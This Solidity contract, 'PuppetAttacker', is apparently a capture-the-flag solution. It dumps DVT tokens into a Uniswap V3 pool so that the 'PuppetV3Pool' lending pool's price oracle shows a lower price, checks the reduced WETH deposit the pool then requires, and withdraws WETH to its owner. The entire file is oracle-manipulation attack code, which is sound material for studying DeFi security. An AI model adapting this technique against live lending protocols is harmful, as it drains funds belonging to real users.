pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "./PuppetV3Pool.sol";


contract PuppetAttacker is IUniswapV3SwapCallback{

    IUniswapV3Pool pool;
    PuppetV3Pool puppetPool;
    IERC20Minimal WETH;
    IERC20Minimal DVT;

    address owner;


    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the Owner!");
        _;
    }


    constructor(address _pool, address _puppetPool, address _weth, address _dvt){
        pool = IUniswapV3Pool(_pool);
        puppetPool = PuppetV3Pool(_puppetPool);
        WETH = IERC20Minimal(_weth);
        DVT = IERC20Minimal(_dvt);
        owner = msg.sender;
    }



    //Perform Swap
    function startSwap(int256 amount)public onlyOwner{
        pool.swap(
            address(this),
            true,
            amount,
            TickMath.MIN_SQRT_RATIO + 1, //ZeroToOne
            ""
        );
    }


    //Check Amount To Deposit
    function checkAmountToDeposit()public view returns(uint){
        uint poolDVTBalance = DVT.balanceOf(address(puppetPool));
        uint deposit = puppetPool.calculateDepositOfWETHRequired(poolDVTBalance);
        return deposit;
    }


    //Swap Callback
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    )external override{
        require(msg.sender == address(pool), "Caller is not the pool during the swap!");
        uint256 amount0 = uint256(amount0Delta);
        DVT.transfer(address(pool), amount0);

    }


    //Withdraw WETH
    function withdrawWETH()public onlyOwner{
        uint balance = WETH.balanceOf(address(this));
        WETH.transfer(owner, balance);
    }



    receive()external payable{}
}
